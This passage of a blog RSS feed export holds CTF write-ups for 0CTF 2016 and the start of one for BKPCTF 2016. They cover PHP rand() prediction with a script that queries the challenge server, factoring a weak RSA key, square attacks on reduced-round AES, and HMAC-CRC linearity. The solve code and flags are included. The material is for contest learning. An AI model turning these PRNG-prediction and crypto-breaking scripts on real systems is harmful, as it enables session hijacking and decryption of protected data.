data-medium-file="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.13.18-PM.png?fit=300%2C281&amp;ssl=1" data-large-file="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.13.18-PM.png?fit=459%2C430&amp;ssl=1" class="alignnone size-medium wp-image-120" src="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.13.18-PM.png?resize=300%2C281&#038;ssl=1" alt="" width="300" height="281" srcset="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.13.18-PM.png?resize=300%2C281&amp;ssl=1 300w, https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.13.18-PM.png?w=459&amp;ssl=1 459w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>Example:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="html">&lt;template&gt;
+    &lt;keep-alive&gt;
+        &lt;router-view&gt;&lt;/router-view&gt;
+    &lt;/keep-alive&gt;
+&lt;/template&gt;
+&lt;script lang="tsx" type="text/typescript"&gt;
+    import {Component, Watch, Prop} from 'vue-property-decorator';
+    import Vue from 'vue';
+    @Component
+    export default class TestScreen extends Vue {
+        created() {
+            this.$root.subapp = this;
+        }
+    }
+&lt;/script&gt;
+</pre>
+<p>&nbsp;</p>
+]]></content:encoded>
+			<wfw:commentRss>https://www.vhn.vn/blog/index.php/2017/07/12/vue-single-file-component-and-typescript/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">116</post-id>	</item>
+		<item>
+		<title>0CTF 2016</title>
+		<link>https://www.vhn.vn/blog/index.php/2016/03/17/0ctf/</link>
+		<comments>https://www.vhn.vn/blog/index.php/2016/03/17/0ctf/#respond</comments>
+		<pubDate>Wed, 16 Mar 2016 17:41:00 +0000</pubDate>
+		<dc:creator><![CDATA[vanhoavn]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">https://www.vhn.vn/blog/?p=87</guid>
+		<description><![CDATA[&#160;]]></description>
+				<content:encoded><![CDATA[<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>rand_2 - 2 pts</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<div class="su-quote su-quote-style-default"><div class="su-quote-inner su-clearfix">Do you believe it, can you recieve it?</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="godzilla">&lt;?php
+include('config.php');
+session_start();
+if($_SESSION['time'] &amp;&amp; time() - $_SESSION['time'] &gt; 60) {
+  session_destroy();
+  die('timeout');
+} else {
+  $_SESSION['time'] = time();
+}
+
+echo rand();
+
+if (isset($_GET['go'])) {
+  $_SESSION['rand'] = array();
+  $i = 5;
+  $d = '';
+  while($i--){
+    $r = (string)rand();
+                $_SESSION['rand'][] = $r;
+                $d .= $r;
+  }
+  echo md5($d);
+} else if (isset($_GET['check'])) {
+  if ($_GET['check'] === $_SESSION['rand']) {
+    echo $flag;
+  } else {
+    echo 'die';
+    session_destroy();
+  }
+} else {
+  show_source(__FILE__);
+}
+?&gt;</pre>
+<div class="su-divider su-divider-style-default" style="margin:15px 0;border-width:3px;border-color:#999999"></div></div></div>
+<p>One more PRNG problem. PHP normally use glibc&#8217;s random function as its underlying implementation, which is <code class="EnlighterJSRAW" data-enlighter-language="null">x[n]=(x[n-3]+x[n-31])&gt;&gt;1</code>. My solution was generating all 2^32 possible cases and confirm with the md5 value. First part of the solution was the cache generator:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;vector&gt;
+#include &lt;map&gt;
+#include &lt;set&gt;
+#include &lt;queue&gt;
+#include &lt;algorithm&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+using namespace std;
+
+namespace vhrand {
+  static long randtbl[DEG_3 + 1] = {
+    TYPE_3,
+    0x991539b1, 0x16a5bce3, 0x6774a4cd, 0x3e01511e, 0x4e508aaa, 0x61048c05,
+    0xf5500617, 0x846b7115, 0x6a19892c, 0x896a97af, 0xdb48f936, 0x14898454,
+    0x37ffd106, 0xb58bff9c, 0x59e17104, 0xcf918a49, 0x09378c83, 0x52c7a471,
+    0x8d293ea9, 0x1f4fc301, 0xc3db71be, 0x39b44e1c, 0xf8a44ef9, 0x4c8b80b1,
+    0x19edc328, 0x87bf4bdd, 0xc9b240e5, 0xe9ee4b1b, 0x4382aee7, 0x535b6b41,
+    0xf3bec5da
+  };
+
+  static long *fptr = &amp;randtbl[SEP_3 + 1];
+  static long *rptr = &amp;randtbl[1];
+
+  static long *state = &amp;randtbl[1];
+  static long rand_type = TYPE_3;
+  static long rand_deg = DEG_3;
+  static long rand_sep = SEP_3;
+  static long *end_ptr = &amp;randtbl[DEG_3 + 1];
+
+  long random();
+
+  //
+  // Compute x = (7^5 * x) mod (2^31 - 1)
+  // wihout overflowing 31 bits:
+  //      (2^31 - 1) = 127773 * (7^5) + 2836
+  // From "Random number generators: good ones are hard to find",
+  // Park and Miller, Communications of the ACM, vol. 31, no. 10,
+  // October 1988, p. 1195.
+  //
+
+  __inline long good_rand(long x) {
+    long hi, lo;
+
+    // Can't be initialized with 0, so use another value.
+    if (x == 0) x = 123459876;
+    hi = x / 127773;
+    lo = x % 127773;
+    x = 16807 * lo - 2836 * hi;
+    if (x &lt; 0) x += 0x7fffffff;
+    return x;
+  }
+  void srandom(unsigned long x) {
+    long i, lim;
+
+    state[0] = x;
+    if (rand_type == TYPE_0) {
+      lim = NSHUFF;
+    } else {
+      for (i = 1; i &lt; rand_deg; i++) state[i] = good_rand(state[i - 1]);
+      fptr = &amp;state[rand_sep];
+      rptr = &amp;state[0];
+      lim = 10 * rand_deg;
+    }
+    
+    for (i = 0; i &lt; lim; i++) random();
+  }
+
+  long random() {
+    long i;
+    long *f, *r;
+
+    if (rand_type == TYPE_0) {
+      i = state[0];
+      state[0] = i = (good_rand(i)) &amp; 0x7fffffff;
+    } else {
+      f = fptr; r = rptr;
+      *f += *r;
+      i = (*f &gt;&gt; 1) &amp; 0x7fffffff; // Chucking least random bit
+      if (++f &gt;= end_ptr) {
+        f = state;
+        ++r;
+      } else if (++r &gt;= end_ptr) {
+        r = state;
+      }
+
+      fptr = f; rptr = r;
+    }
+
+    return i;
+  }
+};
+
+int ctop[2148];
+int cnext[10000000];
+long pendingValues[10000000][2];
+long pendingCount = 0;
+
+void processPending(){
+  printf("Flushing %ld\n",pendingCount);
+  char filename[100];
+  for(int i=0;i&lt;=2147;i++){
+    FILE* h = NULL;
+    for(int j=ctop[i];j&gt;=0;j=cnext[j]){
+      if(pendingValues[j][1]/1000000==i){
+        sprintf(filename, "caches/%d.txt", i);
+        if(h==NULL){
+          h = fopen(filename, "a");
+        }
+        fprintf(h, "%ld %ld\n", pendingValues[j][1], pendingValues[j][0]);
+      }else{
+        printf("ERRROR!!!!!");
+        exit(-1);
+      }
+    }
+    if(h!=NULL) fclose(h);
+  }
+  memset(ctop, -1, sizeof(ctop));
+  pendingCount = 0;
+}
+
+int main(int argc, char *argv[]) {
+  //max=2147483647
+  pendingCount = 0;
+  memset(ctop, -1, sizeof(ctop));
+  for(long i=0;i&lt;2147483647l;i++){
+    if(i%1000000==0)
+      fprintf(stderr,"Generated up to %ld\n",i);
+    vhrand::srandom(i);
+    long val = vhrand::random();
+    long bucket = val/1000000;
+    pendingValues[pendingCount][0]=i;
+    pendingValues[pendingCount][1]=val;
+    cnext[pendingCount]=ctop[bucket];
+    ctop[bucket]=pendingCount;
+    pendingCount++;
+    if(pendingCount==10000000) processPending();
+  }
+  processPending();
+  return 0;
+}</pre>
+<p>While the cache was generating, i ran a script to solve the problem and just left it running tothether with above C++ script:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">&lt;?php
+for(;;){
+  $s=N("http://202.120.7.202:8888/?go=1");
+  preg_match('@Set-Cookie: (.*?); path=\/@', $s, $m);
+  $cookie = $m[1];
+  $param = end((explode("\n", $s)));
+  $md5 = substr($param, -32);
+  $param = intval(substr($param, 0, -32));
+  $bucket = floor($param/1000000);
+  echo "Param: $param ($bucket) | MD5 : $md5\n";
+  if(file_exists($fn = "caches/$bucket.txt")){
+    $h = fopen($fn, "r");
+    while(!feof($h)){
+      fscanf($h, "%d%d", $n, $seed);
+      if($n==$param){
+        srand($seed);
+        $rr = rand();
+        echo "Trying seed=$seed : $rr\n";
+        $url = "http://202.120.7.202:8888/?_=1";
+        $d = "";
+        $i=5;
+        while($i--){
+          $r = (string)rand();
+          $url.="&amp;check[]=$r";
+          $d.=$r;
+        }
+        if($md5 == md5($d)){
+          echo "Finally... ".$url."\n";
+          echo N($url,$cookie);
+          exit;
+        } else {
+          echo "MD5 must be $md5  --  ".md5($d)."\n";
+        }
+      }
+    }
+  }
+  N("http://202.120.7.202:8888/?check=1");
+}
+
+function N($url,$cookie=""){
+  $ch = curl_init();
+  curl_setopt_array($ch, [
+    CURLOPT_URL =&gt; $url,
+    CURLOPT_SSL_VERIFYPEER =&gt; 0,
+    CURLOPT_SSL_VERIFYHOST =&gt; 0,
+    CURLOPT_RETURNTRANSFER =&gt; 1,
+    CURLOPT_POST =&gt; 0,
+    CURLOPT_HEADER =&gt; 1,
+    CURLOPT_COOKIE =&gt; $cookie,
+  ]);
+  $s = curl_exec($ch);
+  curl_close($ch);
+  return $s;
+}
+
+?&gt;</pre>
+<p>The flag printed out after the cache had generated about 500mils items. After sometime i noticed how stupid i was when forgot the Keep-Alive header, yes it has been a long time&#8230;</p>
+<hr />
+<p>&nbsp;</p>
+</div></div>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>rsa - 2 pts</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<div class="su-quote su-quote-style-default"><div class="su-quote-inner su-clearfix">It seems <a href="http://dl.0ops.net/rsa.zip">easy</a>, right?<br />
+Tip: <code>openssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc</code></p>
+</div></div>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="twilight" data-enlighter-highlight="1,6" data-enlighter-linenumbers="false">$ cat public.pem
+-----BEGIN PUBLIC KEY-----
+MEEwDQYJKoZIhvcNAQEBBQADMAAwLQIoAsqpwJ3BBh5Qflt/Od3jRV/P4Seixpti
+HIP9nT0+qjqsQhR81xiMUwIBAw==
+-----END PUBLIC KEY-----
+$ hexdump -C flag.enc
+00000000  00 4c 41 62 a0 7a 01 11  b8 34 4c 68 b1 18 bd 05  |.LAb.z...4Lh....|
+00000010  4a cb c3 8c 31 31 b6 a8  99 9c 91 d1 b3 e2 d8 2d  |J...11.........-|
+00000020  c7 c3 a1 e1 03 4f d6 04                           |.....O..|
+00000028</pre>
+<p>The pem file give us n=23292710978670380403641273270002884747060006568046290011918413375473934024039715180540887338067, e=3. Msieve reported 3 factors of n after about 2 hours:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">a = 26440615366395242196516853423447
+b = 27038194053540661979045656526063
+c = 32581479300404876772405716877547
+</pre>
+<p>It was not that easy, (a-1)*(b-1)*(c-1) is divisible by e, so d does not exists in this system. In this problem we can calculate d&#8217; which&#8217;s</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="no-highlight">cipher^d' = (plain^e)^d' = plain^27 (mod n)</pre>
+<p>Then find all 27th-root of n and check one by one. Final solution&#8217;s below:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">from sage.all import *
+
+n = 23292710978670380403641273270002884747060006568046290011918413375473934024039715180540887338067
+
+a = 26440615366395242196516853423447
+b = 27038194053540661979045656526063
+c = 32581479300404876772405716877547
+
+e = 3
+
+phi = (a-1)*(b-1)*(c-1)
+
+ne = 0
+while phi % (e**(ne+1)) == 0:
+  ne += 1
+print "ne = ", ne
+d = long(1/Mod(e,phi/e**ne))
+print "d = ", d
+
+with open("flag.enc","rb") as f:
+  cipher = f.read(100)
+  
+cipher = int(cipher.encode("hex"),16)
+
+plain_pow_ene = pow(cipher,d*e**ne,n)
+
+print plain_pow_ene
+
+cases = []
+for p in [a,b,c]:
+  cases.append(Mod(plain_pow_ene%p,p).nth_root(e**ne,all=True))
+
+print "Start solving"
+for ar in map(long,Mod(plain_pow_ene%a,a).nth_root(e**ne,all=True)):
+  for br in map(long,Mod(plain_pow_ene%b,b).nth_root(e**ne,all=True)):
+    for cr in map(long,Mod(plain_pow_ene%c,c).nth_root(e**ne,all=True)):
+      x = crt([ar,br,cr],[a,b,c])
+      print hex(x)
+      s = hex(x)
+      if len(s)%2==1:
+        s = "0" + s
+      print s.decode("hex")</pre>
+<p>The flag is:</p>
+<pre class="EnlighterJSRAW" data-enlighter-theme="twilight" data-enlighter-linenumbers="false">0ctf{HahA!Thi5_1s_n0T_rSa~}</pre>
+<p>Yes yes, i know, it was not RSA, of cause&#8230;</p>
+<hr />
+<p>&nbsp;</p>
+</div></div>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>people_square - 6 pts</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<div class="su-quote su-quote-style-default"><div class="su-quote-inner su-clearfix">
+<p>People&#8217;s Square (A.K.A. shenmhin guangshan in Shanghai Dialect) is a large public square in the Huangpu District of Shanghai, China.<br />
+We know <code>Talent Yang is the king of People's Square</code>. Now he provides you a strange guessing game, and he also demonstrates his talent by giving you the result of how he tackles this task. Can you show your talent to decrypt the secret?</p>
+</div></div>
+<p>After a while reading the binaries with IDA, it&#8217;s confirmed that this&#8217;s a problem about recovering a cipher text with known plain-cipher pairs on reduced version of AES (4 rounds). The given binary&#8217;s decompiled code looks like below:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="git" data-enlighter-highlight="1,10,19,38">int __fastcall load_flag(void *a1)
+{
+ FILE *v1; // ST10_8@1
+
+ v1 = fopen("flag.txt", "r");
+ fread(a1, 1uLL, 0x20uLL, v1);
+ return fclose(v1);
+}
+
+int __fastcall load_key(void *a1)
+{
+ FILE *v1; // ST10_8@1
+
+ v1 = fopen("key.txt", "rb");
+ fread(a1, 1uLL, 0x10uLL, v1);
+ return fclose(v1);
+}
+
+__m128i *__fastcall GenerateSamples(__int64 a1, __int64 a2, __int64 a3, int a4, int a5)
+{
+ __int64 v5; // ST28_8@1
+ int v6; // ST20_4@1
+ int v7; // ST18_4@1
+
+ v5 = a3;
+ v6 = a4;
+ v7 = a5;
+ memset((void *)a2, 0, 0x10uLL);
+ memset((void *)v5, 1, 0x10uLL);
+ *(_DWORD *)(a2 + 8) = v6;
+ *(_DWORD *)(v5 + 8) = v6;
+ *(_DWORD *)(a2 + 12) = v7;
+ *(_DWORD *)(v5 + 12) = v7;
+ AESEncrypt(a2, a1);
+ return AESEncrypt(v5, a1);
+}
+
+__int64 main()
+{
+  unsigned __int8 v0; // ST3B_1@6
+  __int64 result; // rax@12
+  int v2; // [sp+3Ch] [bp-174h]@3
+  unsigned __int64 i; // [sp+40h] [bp-170h]@1
+  int v4; // [sp+48h] [bp-168h]@1
+  __int64 v5; // [sp+50h] [bp-160h]@1
+  char sample_1; // [sp+60h] [bp-150h]@3
+  char sample_0; // [sp+70h] [bp-140h]@3
+  char aes_key; // [sp+80h] [bp-130h]@1
+  char key_str; // [sp+170h] [bp-40h]@1
+  char v10; // [sp+180h] [bp-30h]@1
+  __int64 v11; // [sp+190h] [bp-20h]@11
+  __int64 v12; // [sp+1A8h] [bp-8h]@1
+
+  v12 = *__stack_chk_guard_ptr;
+  memset(&amp;v10, 0, 0x20uLL);
+  load_flag(&amp;v10);
+  memset(&amp;key_str, 0, 0x10uLL);
+  load_key(&amp;key_str);
+  AESKeyExpand((__int64)&amp;key_str, (__int64)&amp;aes_key);
+  v5 = 0LL;
+  v4 = time(0LL);
+  for ( i = 0LL; i &lt; 0x400; ++i )
+  {
+    GenerateSamples((__int64)&amp;aes_key, (__int64)&amp;sample_0, (__int64)&amp;sample_1, i, v4);
+    v2 = rand() % 2;
+    if ( v2 )
+      print_hex(&amp;sample_1, 16LL);
+    else
+      print_hex(&amp;sample_0, 16LL);
+    puts("0 or 1?");
+    v0 = getchar() - 48;
+    puts("ciphertext for 0 is: ");
+    print_hex(&amp;sample_0, 16LL);
+    puts("ciphertext for 1 is: ");
+    print_hex(&amp;sample_1, 16LL);
+    if ( v0 == v2 )
+    {
+      ++v5;
+      puts("Correct!");
+    }
+    else
+    {
+      puts("Incorrect!");
+    }
+  }
+  if ( 1024 == v5 )
+  {
+    puts("Now I will give you the flag:");
+    AESEncrypt((__int64)&amp;v10, (__int64)&amp;aes_key);
+    AESEncrypt((__int64)&amp;v11, (__int64)&amp;aes_key);
+    print_hex(&amp;v10, 32LL);
+  }
+  result = *__stack_chk_guard_ptr;
+  if ( *__stack_chk_guard_ptr == v12 )
+    result = 0LL;
+  return result;
+}
+</pre>
+<p>output.txt from problem statement also gave a session that we need to decrypt to obtain flag:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="diff" data-enlighter-theme="git">4d 7c 5d b0 80 45 a2 13 f6 61 0d ca e2 c1 75 9f 
+0 or 1?
+ciphertext for 0 is: 
+d2 e2 57 9e ee 1f e0 dd 39 45 8d 5a 3f 4e 97 65 
+ciphertext for 1 is: 
+4d 7c 5d b0 80 45 a2 13 f6 61 0d ca e2 c1 75 9f 
+Correct!
+1d dc d4 fb e0 4a 33 c2 a8 3f 24 a6 d2 6d 86 39 
+0 or 1?
+ciphertext for 0 is: 
+bb a3 80 8c 66 94 c5 b9 c7 2b 18 ad 8d 9a 1f 78 
+ciphertext for 1 is: 
+1d dc d4 fb e0 4a 33 c2 a8 3f 24 a6 d2 6d 86 39 
+Correct!
+....
+Now I will give you the flag:
+af 93 ce ae 1f 1e 7a 13 26 d6 05 51 97 3c 46 1b c9 b1 56 9c 2c df d5 5a c6 ca 33 46 31 fb 19 73 
+</pre>
+<p>So we have 1024 known cipher texts, in which there is 512 plain text in the format of <code class="EnlighterJSRAW" data-enlighter-language="null">00 00 00 00 00 00 00 00 xx xx xx xx yy yy yy yy</code> where <strong>xxxxxxxx</strong> is an integer from with values in range [0, 1024) and <strong>yyyyyyyy</strong> is a unix timestamp, and the rest is in the format of <code class="EnlighterJSRAW" data-enlighter-language="null">01 01 01 01 01 01 01 01 xx xx xx xx yy yy yy yy</code>.</p>
+<p>After some time spending for research on AES, i found an interesting slide here: <a href="http://www.di.ens.fr/~fouque/pub/fse13b.pdf">http://www.di.ens.fr/~fouque/pub/fse13b.pdf</a>.</p>
+<p>So the final solution is solving the 4-th subkey of given AES session byte by byte, trying all 256 values for each byte of the subkey, perform a single aes decryption step each and xor all the values, the corresponding bytes in the received values will have xor-sum of zero with wrong probality of 2<sup>-8</sup>. The implementation for subkey recovery looks like below:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">def recover_subkey():
+  messages = open("output.txt").read(10*1024*1024).split("\r\n")[:-2]
+  key0 = messages[3::7]
+  key1 = messages[5::7]
+  print len(messages), len(key0), len(key1)
+  key0 = map(parse_hex, key0)
+  key1 = map(parse_hex, key1)
+  
+  sol = [0]*16
+  for ci in range(16):
+    found = False
+    for c in range(256):
+      sol[ci]=c
+      valid = True
+      for i in range(4):
+        sxor3 = "\x00"*16
+        for j in range(256):
+          sxor3 = str_xor(sxor3, decryptOneRound(key0[256*i+j], "".join(map(chr,sol))))
+        if sxor3[ci]!="\x00":
+          valid = False
+          break
+      if valid:
+        print "Found byte ", c
+        found = True
+        break
+    assert found
+  
+  print "Subkey = ", "".join(map(chr,sol)).encode("hex")
+  for i in range(4):
+    sxor3 = "\x00"*16
+    for j in range(256):
+      sxor3 = str_xor(sxor3, backround(key0[256*i+j], "".join(map(chr,sol))))
+    print "Test = ", sxor3.encode("hex")
+</pre>
+<pre class="EnlighterJSRAW" data-enlighter-theme="twilight">f6f601bb7b6adf60d366c0a78724a66b</pre>
+<p>Now we can recover the original key:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">def unexpandKey(self, size, expandedKeySize, finalBlock):
+  expandedKey = [0] * expandedKeySize
+  for j in range(1,1+size):
+    expandedKey[-j] = finalBlock[-j]
+  currentSize = expandedKeySize - 4
+  rconIteration = expandedKeySize/size
+  rdi = 0
+  while currentSize &gt;= size:
+    t = expandedKey[currentSize-4:currentSize]
+    special = False
+    if (currentSize-rdi) % size == 0:
+      rconIteration -= 1
+      t = self.core(t, rconIteration)
+    for m in range(4):
+      expandedKey[currentSize-size+m] = expandedKey[currentSize+m] ^ t[m]
+    currentSize -= 4
+  return expandedKey[:size]
+</pre>
+<pre class="EnlighterJSRAW" data-enlighter-theme="twilight">174a221440356475dce3a037a317ed4b</pre>
+<p>Finally it&#8217;s so easily to decrypt the flag:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="no-highlight" data-enlighter-theme="twilight" data-enlighter-linenumbers="false">0CTF{~R0MAN_l0VES_B10CK_C1PHER~}</pre>
+<hr />
+<p>&nbsp;</p>
+</div></div>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Arsenal - 8 pts</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<div class="su-quote su-quote-style-default"><div class="su-quote-inner su-clearfix">
+<p>There is a rumor that Arsenal F.C., Talent Yang&#8217;s favourite team, always likes to set some &#8220;mission impossible&#8221; tasks for themselves.<br />
+For instance, with a 0-2 home defeat against FC Barcelona they must play a great game in Camp Nou to get to the next round of UEFA Champions League. Can they fulfil this task? Decrypt the provided ciphertext to help them!</p>
+<p>(The executable of this challenge is similar to that of <code>People's Square</code> , check the slight difference and enjoy solving it)</p>
+<p><code>Hint: You should perform 2^32 single round decryption first</code></p>
+</div></div>
+<p>This&#8217;s the same as people_square, but with only 126 known plain texts, with 63 in each group. The zero sumed xor trick cannot be used anymore&#8230;</p>
+<p>I did not have enough time to solve this problem within the context, i was only 2 hours left and i was so tired due to almost 40 hours playing on both 0ctf and codegate.</p>
+<p>The idea is that the internal state of aes before MixColumn step of 3rd round will have unique values when plain text has exactly 1 active byte. We can find out the final subkey by groups of 4 bytes each, confirm the validity of that group with that statement with wrong probability of 256!/[(256-63)! * 256^63] which is almost zero &#8211; more than good enough for us to confirm the validity of specified group.</p>
+<p>Problem is that pure-python implement cant work anymore <img src="https://s.w.org/images/core/emoji/11/72x72/1f600.png" alt="😀" class="wp-smiley" style="height: 1em; max-height: 1em;" /> The implement i made for people_square require about 5 mins to check 10000 cases of a group, that will result in about 1491.30808889 days running (lol), so i decided to try out the <a href="https://en.wikipedia.org/wiki/AES_instruction_set">AES Instruction Set</a> (which&#8217;s used in the problem statement too), and surprisingly, the problem is solved after 20 mins running time!!!</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">int ntest=0;
+  __m128i test[2][100];
+  union{
+    __m128i i128;
+    uint8_t i8[16];
+  } key, state;
+  void solveRound(int a0, int a1, int a2, int a3, int b0, int b1, int b2, int b3){
+    int check[4][256], checkid[4]={7,7,7,7};
+    #define INC(a,b,c,d) ++key.i8[a]==0x00 &amp;&amp; ++key.i8[b]==0x00 &amp;&amp; ++key.i8[c]==0x00 &amp;&amp; ++key.i8[d]==0x00
+    #define TES(a,b) if(check[a][state.i8[b]]!=checkid[a]) check[a][state.i8[b]]=checkid[a]; else {valid=false;break;}
+    memset(check, 0, sizeof(check));
+    for(int i=0;i&lt;4;i++) checkid[i]=1;
+    for(long long i=0;;i++){
+      if(i%100000000==0){
+        printf("%lld / %lld\n",i,(1ll&lt;&lt;32));
+      }
+      bool valid = true;
+      for(int j=0;j&lt;4;j++) checkid[j]++;
+      for(int j=0;j&lt;ntest;j++){
+        state.i128 = _mm_aesdec_si128(_mm_xor_si128(test[0][j],key.i128), _mm_setzero_si128());
+        TES(0,a0);TES(1,a1);TES(2,a2);TES(3,a3);
+      }
+      if(valid){
+        printf("Found!\n");
+        print128_num(key.i128);
+        break;
+      }
+      if(INC(b0, b1, b2, b3)) break;
+    }
+  }
+
+  void solve(){
+    FILE* h = fopen("output.txt", "r");
+    char s[1000];
+    while(!feof(h)){
+      fgets(s, 1000, h); // guess line
+      fgets(s, 1000, h); // 0 or 1?
+      fgets(s, 1000, h); // ciphertext for 0 is: 
+      if(feof_unlocked(h)) break;
+      fgets(s, 1000, h);
+      fromHex((uint8_t*)&amp;test[0][ntest],s);
+      fgets(s, 1000, h); // ciphertext for 1 is:
+      fgets(s, 1000, h);
+      fromHex((uint8_t*)&amp;test[1][ntest],s);
+      fgets(s, 1000, h); //Correct!
+      
+      ntest++;
+    }
+    fclose(h);
+    printf("Total samples = %d\n",ntest);
+    key.i128 =    _mm_setzero_si128();
+    solveRound(0,1,2,3,  0,7,10,13);
+    solveRound(4,5,6,7,  1,4,11,14);
+    solveRound(8,9,10,11,  2,5,8,15);
+    solveRound(12,13,14,15,  3,6,9,12);
+  }</pre>
+<p>The final flag is:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="no-highlight" data-enlighter-theme="twilight" data-enlighter-linenumbers="false">0CTF{~~1MP0SS1BLE_1S_N0TH1NG!~~}</pre>
+</div></div>
+<p>&nbsp;</p>
+]]></content:encoded>
+			<wfw:commentRss>https://www.vhn.vn/blog/index.php/2016/03/17/0ctf/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">87</post-id>	</item>
+		<item>
+		<title>BKPCTF 2016</title>
+		<link>https://www.vhn.vn/blog/index.php/2016/03/07/bkpctf-2016/</link>
+		<comments>https://www.vhn.vn/blog/index.php/2016/03/07/bkpctf-2016/#respond</comments>
+		<pubDate>Mon, 07 Mar 2016 15:48:51 +0000</pubDate>
+		<dc:creator><![CDATA[vanhoavn]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">https://www.vhn.vn/blog/?p=67</guid>
+		<description><![CDATA[Updating&#8230;]]></description>
+				<content:encoded><![CDATA[<div class="su-accordion"><div class="su-spoiler su-spoiler-style-fancy su-spoiler-icon-plus"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>hmac_crc - 5 points</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<div class="su-quote su-quote-style-default"><div class="su-quote-inner su-clearfix">We&#8217;re trying a new mac here at BKP&#8212;HMAC-CRC. The hmac (with our key) of &#8220;zupe zecret&#8221; is &#8216;0xa57d43a032feb286&#8217;.  What&#8217;s the hmac of &#8220;BKPCTF&#8221;? https://s3.amazonaws.com/bostonkeyparty/2016/0c7433675c3c555afb77271d6a549bf5d941d2ab</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/env python
+def to_bits(length, N):
+  return [int(i) for i in bin(N)[2:].zfill(length)]
+
+def from_bits(N):
+  return int("".join(str(i) for i in N), 2)
+
+CRC_POLY = to_bits(65, (2**64) + 0xeff67c77d13835f7)
+CONST = to_bits(64, 0xabaddeadbeef1dea)
+
+def crc(mesg):
+  mesg += CONST
+  shift = 0
+  while shift &lt; len(mesg) - 64:
+    if mesg[shift]:
+      for i in range(65):
+        mesg[shift + i] ^= CRC_POLY[i]
+    shift += 1
+  return mesg[-64:]
+
+INNER = to_bits(8, 0x36) * 8
+OUTER = to_bits(8, 0x5c) * 8
+
+def xor(x, y):
+  return [g ^ h for (g, h) in zip(x, y)]
+
+def hmac(h, key, mesg):
+  return h(xor(key, OUTER) + h(xor(key, INNER) + mesg))
+
+PLAIN_1 = "zupe zecret"
+PLAIN_2 = "BKPCTF"
+
+def str_to_bits(s):
+  return [b for i in s for b in to_bits(8, ord(i))]
+
+def bits_to_hex(b):
+  return hex(from_bits(b)).rstrip("L")
+
+if __name__ == "__main__":
+  with open("key.txt") as f:
+    KEY = to_bits(64, int(f.read().strip("\n"), 16))
+  print PLAIN_1, "=&gt;", bits_to_hex(hmac(crc, KEY, str_to_bits(PLAIN_1)))
+  print "BKPCTF{" + bits_to_hex(hmac(crc, KEY, str_to_bits(PLAIN_2))) + "}"
+</pre>
+<p>&nbsp;</p>
+</div></div>
+<p>Let&#8217;s write out the hashing function (hmac-crc):  <code class="EnlighterJSRAW" data-enlighter-language="null">hash(x,m) := crc( (x ⊕ C1) + crc( (x ⊕ C2) + m ) )</code>  where + is string concat.</p>
+<p>We dont have key, but have a (message, hash) pair (&#8220;zupe zecret&#8221;, 0xa57d43a032feb286), and need to find correct hash for message &#8220;BKPCTF&#8221;.</p>
+<p>The first approach i came up with was brute-forcing, and z3 refused to give me any answer after waiting some hour&#8230;</p>
+<p>Let&#8217;s go deeper, crc function is based on linear combinator of xor, so it&#8217;s linear over xor:</p>
+<p style="text-align: center;"> <code class="EnlighterJSRAW" data-enlighter-language="null">crc(x ⊕ y) = crc(x) ⊕ crc(y)</code>,</p>
+<p>which&#8217;s also mean that</p>
+<p style="text-align: center;"> <code class="EnlighterJSRAW" data-enlighter-language="null">crc(crc(x ⊕ y)) = crc(crc(x) ⊕ crc(y)) = crc(crc(x)) ⊕ crc(crc(y))</code>.</p>
+<p>Back to original hashing function, we can turn string concat into bitwise concat as</p>
+<p style="text-align: center;"><code class="EnlighterJSRAW" data-enlighter-language="null">x + y = (x&lt;&lt;y.bit_length()) | y</code></p>
